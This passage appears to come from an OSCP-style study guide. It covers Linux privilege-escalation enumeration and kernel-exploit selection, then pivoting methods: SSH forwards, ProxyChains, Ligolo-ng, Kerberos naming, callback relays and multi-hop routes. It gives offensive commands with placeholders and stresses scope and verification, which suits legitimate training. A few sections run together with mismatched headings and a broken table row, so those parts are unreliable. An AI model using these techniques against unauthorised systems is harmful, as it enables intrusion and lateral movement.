documented exploit-specific conditions. ### 4. Discover and verify prerequisites ```bash uname -a cat /etc/os-release getconf LONG_BIT ``` ### 5. Why it works Kernel release strings can hide patched distributions. A matching CVE needs affected code/configuration and compatible exploit assumptions; a crash is neither success nor proof that another build will work. ### 6. Execute and choose variants ```bash uname -a cat /proc/version cat /etc/os-release dpkg -l 2>/dev/null rpm -qa 2>/dev/null sudo --version lsmod sysctl kernel.unprivileged_userns_clone 2>/dev/null ``` ```bash searchsploit "PRODUCT VERSION local privilege escalation" searchsploit -x EDB_ID searchsploit -m EDB_ID gcc -Wall -Wextra exploit.c -o exploit file exploit sha256sum exploit ``` > Match component, exact distribution/build and patch/backport state, architecture, required configuration/capabilities/namespaces, mitigations and dependencies. Review source and recovery risk. A version title or successful compilation is only a candidate. Follow [public exploit adaptation](../../reference/03-initial-access/06-public-exploit-adaptation.md). ### 7. Worked example — hypothetical Observation: an automated tool names a kernel CVE. Test: compare the distribution patch/build and required feature. Illustrative output: the vendor build includes the fix. Interpretation: reject the candidate and return to unexamined permissions/applications. ### 8. Verify the result Verify actual effective UID/host context after the exploit, keeping the reviewed source and adaptation record. ### 9. Failure and fallback Wrong build, missing feature or mitigation can invalidate the PoC. Choose another evidence-backed candidate rather than cycling random local exploits. ### 10. Next transitions [Match a public exploit to the actual component and configuration](public-exploits.md#exploit-select); [Compile and minimally adapt an existing native or memory-corruption PoC](public-exploits.md#exploit-compile); [Establish Linux state and choose an escalation candidate](linux-privesc.md#linux-state). ## Use enumeration tools to generate manually testable candidates **Blocks:** 8. [Operational procedure](../../reference/05-local-privilege-escalation/01-linux-privilege-escalation.md#14-automated-enumeration-generate-then-prove) | [Quick sheet](../../cheatsheets/linux-privesc.md) ### 1. Purpose and result Candidate permissions, credentials and consumers for manual validation. ### 2. Recognition clues A Linux foothold is available; run an early sweep for sudo rules, file capabilities, credentials and writable privileged paths. #### Find the clue from your starting access **Where to investigate:** Use known manual gaps and the host/runtime context to choose a reviewed enumerator; inspect each highlighted finding against native evidence. **Discovery action — reference example:** ```bash id uname -m command -v bash python3 ls -ld /tmp ``` **Illustrative evidence — synthetic, abbreviated:** The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. ```text Enumerator candidate: writable /opt/APP/script.sh Consumer identity: unknown Trigger: unknown ``` **Recognize this detail:** The highlight supplies a candidate object, not the missing privileged consumer or execution trigger. **Still missing before method selection:** Run the reviewed LinPEAS baseline and save its output. For sudo highlights run sudo -l; for a flagged file use stat/namei/getfacl; for jobs confirm the UID and command with pspy or systemctl. Open the matching technique only after that check. | Outcome after checking | Example and next decision | | --- | --- | | Enabled after validation | The full manual chain validates: follow its owning method. | | Ruled out in this context | Only a low-privileged process consumes the object: reject the escalation hypothesis. | | Inconclusive | Missing tools or restricted /proc can hide evidence; investigate application-specific paths manually. | **If you do not yet have this clue:** start with [Establish Linux state and choose an escalation candidate](linux-privesc.md#linux-state). ### 3. Prerequisites **Starting access:** A verified Linux foothold with a known effective UID, groups and filesystem context. **Required conditions:** Verified target UID and architecture, a working shell/runtime, a reviewed transferred tool and a writable report location. ### 4. Discover and verify prerequisites ```bash id uname -m command -v bash python3 ls -ld /tmp ``` ### 5. Why it works Enumerators aggregate observations and heuristics. A highlighted path does not prove effective ACLs, privileged consumption, trigger or successful exploitation. ### 6. Execute and choose variants For the early collector pass, transfer a reviewed LinPEAS copy, check the current UID/architecture and save its output. This form does not require an executable bit: ```bash sh ./linpeas.sh | tee linpeas.txt ``` Follow the named finding into the matching sudo, SUID/capability, writable-consumer or credential procedure. Use the local help for optional modes; broader/noisier checks are not the automatic baseline. ```bash ./linpeas.sh | tee linpeas.txt ./lse.sh | tee lse.txt ./lse.sh -l1 | tee lse-l1.txt ./unix-privesc-check standard > unix-privesc-check.txt ``` > LinPEAS optional flags vary by build. Read the local `./linpeas.sh -h` before selecting broader checks; they are not the automatic baseline. LSE progresses from default to `-l1`, then `-l2` only if needed. `unix-privesc-check detailed` is slower and more false-positive-prone. For every highlight: ```text exact object | effective permission | privileged consumer | identity | trigger | expected effect | manual verification ``` Do not pipe an unverified Internet download into the target shell. Acquire a trusted copy, retain its source/hash, transfer deliberately and remove assessment artifacts when appropriate. ### 7. Worked example — hypothetical Observation: LinPEAS highlights a writable path. Test: inspect its exact ACL, parent rights and consumer. Illustrative output: only an unprivileged process uses it. Interpretation: reject the escalation hypothesis while retaining the writable-path fact. ### 8. Verify the result Read linpeas.txt. Confirm a reported sudo rule with sudo -l, a privileged path with namei/stat/getfacl, or a scheduled consumer with pspy before using that finding ### 9. Failure and fallback Script blocked or output empty: check the shell, transfer integrity and output path, then use the native checks for the observed rule/file/job. Empty collector output does not rule out escalation ### 10. Next transitions [Prove effective file, directory, ACL and mount control](linux-privesc.md#linux-permissions); [Control a script, binary or configuration consumed by a privileged job/service](linux-privesc.md#linux-jobs); [Use an allowed sudo operation to cross a privilege boundary](linux-privesc.md#linux-sudo). ## Sources and shared concepts Supplied PEN-200 Ch 18 pp550–582. [Hexdump Linux modules](https://github.com/LeonardoE95/OSCP/tree/main/modules/linux) cover permissions, sudo/SUID, PATH, wildcards, capabilities and cron. [GTFOBins](https://gtfobins.github.io/) supplies binary-specific modes after prerequisite validation. Commands and their adjacent variant conditions are synchronized extracts of the linked operational procedures. Those procedures own complete execution details; this guide owns method selection, explanations and worked reasoning. Tool availability on the learner's Kali or a target must be checked in that environment.

# Reach internal services [Strategy map](../Attack_Strategy_Map.md) | [Master Notes](../Master_Notes.md) | [Operational index](../../README.md) | [Cheatsheets](../../cheatsheets/README.md) A tunnel moves traffic; it does not grant destination authorization. Draw listener location, connection initiator, remote destination, DNS resolution and return path separately. **Speedrun blocks:** 13; study fundamentals before 10–12. **Documented methods:** 16. Examples are hypothetical study material. Apply commands only to an assigned scope during the later practice phase. A method is enabled by its prerequisites; its presence here does not establish a vulnerability or practical mastery. ## First pass: tools and findings Use the branch matching the current host, identity and observed result. Tool output supplies leads; the linked procedure verifies and uses the exact condition. ### Enumerate what the pivot can actually reach Run route/listener checks on the pivot itself; do not infer its access from the attacker machine. ```bash ip addr ip route ss -lntup ``` - **If One internal TCP endpoint is reachable from the pivot:** Draw the local/pivot listener and initiator before choosing a fixed forward. → [Forward a selected service through an SSH client-side listener](pivoting.md#ssh-local). - **If Several internal services need proxy/routed access:** Match the client protocol to SOCKS or a TUN route. → [Provide SOCKS access through SSH dynamic forwarding](pivoting.md#ssh-dynamic). - **Otherwise:** The pivot cannot reach the destination: fix that leg before adding a tunnel. → [Discover pivot interfaces, routes and internal service context](pivoting.md#pivot-state). ### Use SSH forwarding for the required direction Use this when the attacker can SSH to a pivot that can reach the destination; remote forwarding reverses the listener placement. ```bash ssh -N \ -L 127.0.0.1:LOCAL_PORT:INTERNAL_HOST:INTERNAL_PORT \ -p SSH_PORT USER@PIVOT \ -o ExitOnForwardFailure=yes \ -o ServerAliveInterval=30 -o ServerAliveCountMax=3 ``` - **If The forwarded service responds through the listener:** Re-enumerate that destination with the matching service client. → [Identify applications and validate selected NSE checks](discovery.md#identify-app). - **If Only the pivot can initiate the tunnel connection:** Select the reverse/listener arrangement deliberately. → [Expose an SSH-client-side destination through a server-side remote listener](pivoting.md#ssh-remote). - **Otherwise:** The listener exists but the app fails: test destination reachability and DNS through the chosen path. → [Preserve DNS, Kerberos names and time across a pivot](pivoting.md#pivot-dns). ### Use Ligolo for a justified routed requirement Use the version-specific agent/proxy procedure and route setup. A tunnel session alone is not a working destination route. ```bash ./proxy -selfcert -laddr 0.0.0.0:LIGOLO_PORT ``` - **If The selected subnet is routed and the destination responds:** Re-run service discovery from that new position. → [Identify applications and validate selected NSE checks](discovery.md#identify-app). - **If Delivery works but the payload callback fails:** Build and verify the separately needed return/callback path. → [Build the callback and delivery routes separately from the attack route](pivoting.md#pivot-callback). - **Otherwise:** Route/session setup fails: inspect the route, interface privileges and each connection leg. → [Discover pivot interfaces, routes and internal service context](pivoting.md#pivot-state). ## Discovery workflow Start from the pivot's current shell/process or accepted SSH access; another reachable subnet and an operational tunnel are not assumed. Follow these observations into a method; the detailed recognition routes below show synthetic output and the checks still needed. 1. Inspect pivot interfaces, routes, local listeners and destination reachability: [Discover pivot interfaces, routes and internal service context](pivoting.md#pivot-state). 2. Draw listener location and connection initiator before fixed or SSH forwarding: [Relay a single TCP service through a fixed forward](pivoting.md#fixed-forward); [Forward a selected service through an SSH client-side listener](pivoting.md#ssh-local); [Expose an SSH-client-side destination through a server-side remote listener](pivoting.md#ssh-remote). 3. Choose proxy versus routed access according to the real client/protocol requirements: [Provide SOCKS access through SSH dynamic forwarding](pivoting.md#ssh-dynamic); [Use ProxyChains, native SOCKS clients and SSH jump paths appropriately](pivoting.md#proxy-clients); [Route a selected internal subnet through Ligolo-ng](pivoting.md#ligolo-route). 4. Validate names, KDC access and the separately required delivery/callback route: [Preserve DNS, Kerberos names and time across a pivot](pivoting.md#pivot-dns); [Build the callback and delivery routes separately from the attack route](pivoting.md#pivot-callback). 5. For additional hops test each leg before chaining the final application: [Compose multiple pivots and validate every connection leg](pivoting.md#pivot-multihop). **Decision rule:** an observed clue opens a candidate. Choose it only after the missing conditions are verified; a failed check rules out that context, while unavailable evidence stays inconclusive. ## Method families - **Network position and fixed relays:** [Discover pivot interfaces, routes and internal service context](#pivot-state), [Relay a single TCP service through a fixed forward](#fixed-forward). - **SSH listener direction and proxy access:** [Forward a selected service through an SSH client-side listener](#ssh-local), [Provide SOCKS access through SSH dynamic forwarding](#ssh-dynamic), [Expose an SSH-client-side destination through a server-side remote listener](#ssh-remote), [Expose a server-side SOCKS proxy through remote dynamic SSH forwarding](#ssh-remote-dynamic), [Use ProxyChains, native SOCKS clients and SSH jump paths appropriately](#proxy-clients). - **Transparent and Windows forwarding:** [Route a selected subnet through sshuttle](#sshuttle-route), [Forward from Windows with OpenSSH, Plink or Netsh](#windows-forward). - **Alternative carriers and routed agents:** [Use a reverse Chisel SOCKS or fixed TCP tunnel](#chisel-reverse), [Use forward Chisel SOCKS and version-supported UDP routing](#chisel-forward), [Route a selected internal subnet through Ligolo-ng](#ligolo-route), [Conditional: tunnel through controlled DNS infrastructure](#pivot-dns-tunnel). - **Names, return paths and multiple hops:** [Preserve DNS, Kerberos names and time across a pivot](#pivot-dns), [Build the callback and delivery routes separately from the attack route](#pivot-callback), [Compose multiple pivots and validate every connection leg](#pivot-multihop). ## Choose a method | Method | Recognition clue | Required access | Enabling conditions | Resulting capability | | --- | --- | --- | --- | --- | | [Discover pivot interfaces, routes and internal service context](#pivot-state) | A foothold exposes an interface/subnet or a loopback-only service | A pivot identity/process or reachable SSH service and a drawn source-to-destination path | A usable pivot process/identity and explicit scope; both forward and return directions must be understood | A route diagram identifying listener, initiator, pivot destination and protocol | | [Relay a single TCP service through a fixed forward](#fixed-forward) | One reachable pivot can connect to one internal TCP destination | A pivot identity/process or reachable SSH service and a drawn source-to-destination path | A bindable pivot listener, source-to-listener access and pivot-to-destination connectivity | A reachable local/pivot port carrying one destination service | | [Forward a selected service through an SSH client-side listener](#ssh-local) | SSH reaches a server that can access the needed internal service | A pivot explicitly | A client-side SOCKS proxy for selected destination connections | | [Expose an SSH-client-side destination through a server-side remote listener](#ssh-remote) | The useful side can initiate SSH outward but cannot accept an inbound management connection | A pivot identity/process or reachable SSH service and a drawn source-to-destination path | Outbound SSH route, accepted identity, server forwarding/GatewayPorts policy and reachability to the chosen client-side destination | A server-side listener forwarding to a destination reached from the SSH client | | [Expose a server-side SOCKS proxy through remote dynamic SSH forwarding](#ssh-remote-dynamic) | Only the pivot can initiate SSH, but several client-selected internal destinations are needed | A pivot identity/process or reachable SSH service and a drawn source-to-destination path | A supporting OpenSSH client, allowed remote forwarding, listener binding and SOCKS-compatible tool clients | A server-side SOCKS listener whose connections exit from the SSH client/pivot | | [Use ProxyChains, native SOCKS clients and SSH jump paths appropriately](#proxy-clients) | A SOCKS listener or an SSH jump host is already available | A pivot identity/process or reachable SSH service and a drawn source-to-destination path | Client/proxy transport compatibility, correct proxy configuration and controlled name resolution | A verified application connection through the chosen proxy/jump | | [Route a selected subnet through sshuttle](#sshuttle-route) | Multiple internal TCP destinations need transparent application access over SSH | A pivot identity/process or reachable SSH service and a drawn source-to-destination path | Working SSH/Python environment, local routing/firewall privileges and explicitly selected supported traffic/subnets | A verified transparent route for the chosen supported traffic | | [Forward from Windows with OpenSSH, Plink or Netsh](#windows-forward) | The pivot is Windows and available networking utilities constrain the route | A pivot identity/process or reachable SSH service and a drawn source-to-destination path | Compatible OpenSSH/Plink authentication or administrative Netsh/IP Helper context; correct listener and destination paths | A selected TCP service reachable through the Windows pivot | | [Use a reverse Chisel SOCKS or fixed TCP tunnel](#chisel-reverse) | A pivot can make outbound HTTP/WebSocket connections to the tunnel server | A pivot identity/process or reachable SSH service and a drawn source-to-destination path | Compatible reviewed client/server, server reverse mode, reachable server port and pivot-to-destination access | A server-side SOCKS or fixed-port route into pivot-reachable services | | [Use forward Chisel SOCKS and version-supported UDP routing](#chisel-forward) | The assessment-side client can reach a pivot-side tunnel server | A pivot identity/process or reachable SSH service and a drawn source-to-destination path | Compatible client/server roles, reachable carrier, correctly placed SOCKS listener and explicitly supported UDP-aware mode when required | A forward proxy route with documented TCP/UDP behavior | | [Route a selected internal subnet through Ligolo-ng](#ligolo-route) | Several protocols/subnets require a route-style interface through an agent | A pivot identity/process or reachable SSH service and a drawn source-to-destination path | Compatible proxy/agent, permitted local interface/route management, reachable carrier and selected assigned subnet | A verified routed connection path including supported loopback/listener features | | [Conditional: tunnel through controlled DNS infrastructure](#pivot-dns-tunnel) | DNS is an available carrier while simpler permitted routes are unavailable | A pivot identity/process or reachable SSH service and a drawn source-to-destination path | Controlled/delegated domain or supported direct setup, reachable DNS path, compatible server/client and allowed execution | A verified constrained DNS carrier and its explicitly configured access capabilities | | [Preserve DNS, Kerberos names and time across a pivot](#pivot-dns) | An IP connection works while hostname/Kerberos access fails | A pivot identity/process or reachable SSH service and a drawn source-to-destination path | Reachable correct resolver/KDC path, matching target SPN/hostname, realm configuration and acceptable time | A route-compatible name and authentication context | | [Build the callback and delivery routes separately from the attack route](#pivot-callback) | A pivoted exploit reaches its target but its shell/download cannot return | A pivot identity/process or reachable SSH service and a drawn execution chain | | [Compose multiple pivots and validate every connection leg](#pivot-multihop) | A second internal network is reachable only from a later foothold | A pivot identity/process or reachable SSH service and a drawn source-to-destination path | A working first route, explicit second carrier/listener directions and correct per-hop DNS/return paths | A verified selected route across multiple source positions | ## Discover pivot interfaces, routes and internal service context **Blocks:** 13; study fundamentals before 10–12. [Operational procedure](../../reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding.md#1-draw-the-route-before-choosing-a-command) | [Operational procedure](../../reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding.md#2-discover-the-pivots-network-position) | [Operational procedure](../../reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding.md#3-choose-the-smallest-compatible-route) | [Operational procedure](../../reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding.md#16-verification-and-cleanup) | [Quick sheet](../../cheatsheets/pivoting.md) ### 1. Purpose and result A route diagram identifying listener, initiator, pivot destination and protocol. ### 2. Draw both legs and the initiator; only choose SSH/SOCKS/Ligolo after the destination leg works. | Outcome after checking | Example and next decision | | --- | --- | | Enabled after validation | The pivot reaches the needed endpoint and a supported tunnel can carry the client: choose that route. | | Ruled out in this context | The new subnet is outside assigned scope: do not use it as an attack route. | | Inconclusive | Interface/route presence alone does not prove destination/firewall access. | **If you do not yet have this clue:** start with [Verify command execution, host and represented identity](sessions-transfers.md#session-proof). ### 3. Prefer this native proxy route when ProxyChains interposition is unreliable.
Use an SSH configuration for repeated access ```sshconfig Host pivot HostName PIVOT User PIVOT_USER Host internal HostName INTERNAL_HOST User TARGET_USER ProxyJump pivot ``` ```bash ssh internal scp FILE internal:DESTINATION_PATH ```
Use a task-specific configuration rather than repeatedly editing a shared global file: ```text strict_chain proxy_dns tcp_read_time_out 15000 tcp_connect_time_out 8000 [ProxyList] socks5 127.0.0.1 1080 ``` ```bash proxychains4 -q -f ./proxychains-pivot.conf curl http://INTERNAL_HOST:PORT/ proxychains4 -q -f ./proxychains-pivot.conf nmap -sT -Pn -n -p PORTS INTERNAL_HOST proxychains4 -q -f ./proxychains-pivot.conf impacket-smbclient \ 'DOMAIN/USER:PASSWORD@INTERNAL_HOST' ``` Constraints: - ProxyChains hooks socket calls in dynamically linked programs; some static binaries, scripts, child processes or dynamically loaded modules bypass or break the hook. - ProxyChains supports TCP only. It does not proxy UDP, ICMP, SYN scans or pcap-based discovery. - For Nmap use `-sT -Pn -n` with a focused port list. Recognition clues An IP connection works while hostname/Kerberos access fails. #### Find the clue from your starting access **Where to investigate:** Compare name resolution, ticket server principals, clock and the KDC path when an IP service works but named authentication fails. **Discovery action — reference example:** ```bash getent hosts TARGET_HOST klist date -u ``` **Illustrative evidence — synthetic, abbreviated:** The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. ```text TARGET_HOST resolves to WRONG_ADDRESS Ticket server: cifs/TARGET_HOST@REALM Direct IP transport: works ``` **Recognize this detail:** The route and credential may be valid while name/SPN context is wrong. **Still missing before method selection:** Check intended DNS source/result, realm/service name, time and KDC/service routes separately. | Outcome after checking | Example and next decision | | --- | --- | | Enabled after validation | Correct naming/time and routes produce accepted service authentication: use that identity-preserving path. | | Ruled out in this context | The ticket names another service/host: reject it for this operation. | | Inconclusive | Successful IP transport without named service evidence does not settle Kerberos. | **If you do not yet have this clue:** start with [Discover pivot interfaces, routes and internal service context](pivoting.md#pivot-state). ### 3. Prerequisites **Starting access:** A pivot identity/process or reachable SSH service and a drawn source-to-destination path. **Required conditions:** Reachable correct resolver/KDC path, matching target SPN/hostname, realm configuration and acceptable time. ### 4. Discover and verify prerequisites ```bash getent hosts TARGET_HOST klist date -u ``` ### 5. Why it works Connection address and Kerberos service identity can be separated by supported client options. Local DNS or an IP substituted for an SPN can break a valid route/credential combination. ### 6. Execute and choose variants - Decide whether the application resolves the name locally, ProxyChains intercepts it, the SOCKS exit resolves it, or the pivot's configured resolver handles it. - Use numeric addresses for route validation; then restore the confirmed hostname when the application protocol requires it. - Kerberos needs an SPN-compatible hostname, realm/KDC route and correct time. A working IP connection does not prove Kerberos naming works. - A temporary host mapping is acceptable only for a confirmed in-scope address/name pair and must be recorded. ```bash getent hosts INTERNAL_FQDN curl --socks5-hostname 127.0.0.1:1080 http://INTERNAL_FQDN:PORT/ klist KRB5_TRACE=/dev/stderr kvno cifs/TARGET_HOST ``` The first command checks Kali's normal resolver. The `curl` form deliberately delegates the destination hostname through SOCKS. Do not assume a generic resolver utility will be intercepted by ProxyChains: NSS implementation and process behavior vary. For Impacket, preserve the target hostname while routing to an IP when the tool supports it: ```bash impacket-wmiexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP \ 'DOMAIN/USER@TARGET_HOST' ``` ### 7. Worked example — hypothetical Observation: SMB by IP connects but Kerberos by hostname fails. Test: inspect resolver result, SPN naming and KDC route. Illustrative output: the hostname resolves outside the intended route. Interpretation: correct name resolution while preserving the service identity. ### 8. Verify the result Verify resolved destination, ticket/server principal and actual authenticated application action. ### 9. Failure and fallback Do not downgrade the identity claim because transport works. DNS, time, KDC access and service authorization are independent checks. ### 10. Next transitions [Inventory, convert and import tickets in the correct logon context](ad-identities.md#kerberos-tickets); [Select password, NT hash, key-to-ticket or ticket authentication](lateral-movement.md#move-auth-material); [Establish domain identity, DC, DNS, time and route](ad-mapping.md#domain-state); [Conditional: tunnel through controlled DNS infrastructure](pivoting.md#pivot-dns-tunnel). ## Build the callback and delivery routes separately from the attack route **Blocks:** 13; study fundamentals before 10–12. [Operational procedure](../../reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding.md#12-callback-and-delivery-routing) | [Quick sheet](../../cheatsheets/pivoting.md) ### 1. Purpose and result A verified return or file-delivery path for the selected execution chain. ### 2. Recognition clues A pivoted exploit reaches its target but its shell/download cannot return. #### Find the clue from your starting access **Where to investigate:** After the attack path works, draw a new path for target-initiated callbacks/downloads and inspect the listener actually advertised to that target. **Discovery action — reference example:** ```bash ss -lnt ip route get TARGET ``` **Illustrative evidence — synthetic, abbreviated:** The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. ```text Tool -> proxy -> target: works Advertised LHOST: assessment-only interface Target -> advertised LHOST: no established route ``` **Recognize this detail:** A working initiating proxy path does not route a target's new connection back to that private interface. **Still missing before method selection:** Check the target's route, listener bind, chosen reverse forward/agent listener and final handler. | Outcome after checking | Example and next decision | | --- | --- | | Enabled after validation | The target-initiated leg reaches the intended receiver and effect is verified: use the return route. | | Ruled out in this context | The target cannot reach the advertised address and no selected forward provides it: reject that callback address/design. | | Inconclusive | No packets without execution proof leaves trigger and route separately unresolved. | **If you do not yet have this clue:** start with [Diagnose connection direction, listener and session failures in order](execution.md#execution-callback). ### 3. Prerequisites **Starting access:** A pivot identity/process or reachable SSH service and a drawn source-to-destination path. **Required conditions:** Target-to-listener/download-server path, correct advertised address and compatible reverse listener/forward. ### 4. Discover and verify prerequisites ```bash ss -lnt ip route get TARGET ``` ### 5. Why it works Tool-to-target traffic and target-initiated callbacks can require opposite forwards. A working SOCKS request does not automatically route a target's reverse shell to Kali. ### 6. Execute and choose variants A forward path and callback path are different graphs: ```text Kali -> tunnel -> internal service # access path internal target -> pivot -> Kali listener # callback path ``` Options: 1. make the callback directly to an address the internal host already reaches; 2. expose a listener on the pivot and relay it to Kali; 3. use a Ligolo agent listener or SSH/Chisel remote forward; 4. choose a non-callback technique such as authenticated remote execution. Fixed SSH callback relay, run from the pivot: ```bash ssh -N -g -L 0.0.0.0:PIVOT_PORT:127.0.0.1:KALI_PORT \ KALI_USER@LHOST -o ExitOnForwardFailure=yes ``` This creates the listener on the SSH client/pivot and makes the destination connection from Kali's SSH server to Kali loopback. `-g` permits other hosts to use the pivot-side local forward. Verify the actual bind with `ss`; do not infer it from command syntax. Also route payload delivery separately. An internal host may reach the pivot but not Kali's HTTP server; relay the delivery service or serve from the pivot when justified. ### 7. Worked example — hypothetical Observation: a target is exploitable through SOCKS but no callback arrives. Test: draw the target's actual route to LHOST and expose the documented pivot listener. Illustrative output: traffic reaches the forwarded listener. Interpretation: now verify payload/handler compatibility. ### 8. Verify the result Verify the target-initiated connection from its source context and the final session or downloaded bytes. ### 9. Failure and fallback Wrong advertised interface, loopback bind or missing reverse forward breaks the return leg while leaving the initial attack functional. ### 10. Next transitions [Diagnose connection direction, listener and session failures in order](execution.md#execution-callback); [Connect a Linux reverse shell through an available interpreter](sessions-transfers.md#session-reverse); [Transfer over HTTP using Linux or Windows clients](sessions-transfers.md#transfer-http). ## Compose multiple pivots and validate every connection leg **Blocks:** 13; study fundamentals before 10–12. [Operational procedure](../../reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding.md#13-multi-hop-routes) | [Quick sheet](../../cheatsheets/pivoting.md) ### 1. Purpose and result A verified selected route across multiple source positions. ### 2. Recognition clues A second internal network is reachable only from a later foothold. #### Find the clue from your starting access **Where to investigate:** Start from the last verified first-hop state, inspect the next foothold's routes and assign each new listener/carrier a source and destination. **Discovery action — reference example:** ```bash hostname ip route ss -lnt ``` **Illustrative evidence — synthetic, abbreviated:** The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. ```text Hop 1 service test: works Hop 2 carrier: connected Final application: times out ``` **Recognize this detail:** The break lies beyond a known working leg; a connected second carrier is not a complete final route. **Still missing before method selection:** Test each listener-to-destination leg, names and return traffic independently from the correct source. | Outcome after checking | Example and next decision | | --- | --- | | Enabled after validation | Every required application leg is verified: use the composed route. | | Ruled out in this context | One required hop cannot reach the destination under the selected topology: reject that composition. | | Inconclusive | A final timeout without per-leg tests cannot identify which hop failed. | **If you do not yet have this clue:** start with [Discover pivot interfaces, routes and internal service context](pivoting.md#pivot-state). ### 3. Prerequisites **Starting access:** A pivot identity/process or reachable SSH service and a drawn source-to-destination path. **Required conditions:** A working first route, explicit second carrier/listener directions and correct per-hop DNS/return paths. ### 4. Discover and verify prerequisites ```bash ip route ss -lnt ``` ### 5. Why it works Each additional hop introduces another initiator/listener/destination path. A connected second agent does not prove that the final application or callback crosses every leg. ### 6. Execute and choose variants For every additional hop, write another complete segment: ```text Kali -> tunnel A -> PIVOT_A -> tunnel B -> PIVOT_B -> INTERNAL_HOST:PORT ``` Rules: - validate one hop before adding the next; - avoid overlapping local/VPN/internal routes; - use unique listener and SOCKS ports; - record which session owns each route; - ensure the deeper agent/client can reach the upstream listener; - re-evaluate DNS and callback direction at every hop; - prefer a routed method for several deep services instead of stacking many opaque wrappers. An upstream tunnel failure invalidates every deeper observation. Do not troubleshoot target credentials until the complete path is restored. ### 7. Worked example — hypothetical Observation: the first pivot reaches the second host but not its internal subnet. Test: verify the second host's route, then the selected service on each leg. Illustrative output: one forward points to the wrong loopback. Interpretation: fix that leg and retain the working first hop. ### 8. Verify the result Validate each hop with an application-aware test before chaining the final client. ### 9. Failure and fallback Avoid rebuilding every tunnel after one failure. Isolate the first broken leg and preserve working state. ### 10. Next transitions [Discover pivot interfaces, routes and internal service context](pivoting.md#pivot-state); [Build the callback and delivery routes separately from the attack route](pivoting.md#pivot-callback); [Match route, destination service and effective authorization](lateral-movement.md#move-preflight). ## Sources and shared concepts Supplied PEN-200 Ch 19–20 pp583–652. [OpenSSH](https://man.openbsd.org/ssh), [Chisel](https://github.com/jpillora/chisel), [Ligolo-ng](https://docs.ligolo.ng/), [sshuttle](https://sshuttle.readthedocs.io/). Commands and their adjacent variant conditions are synchronized extracts of the linked operational procedures. Those procedures own complete execution details; this guide owns method selection, explanations and worked reasoning. Tool availability on the learner's Kali or a target must be checked in that environment.
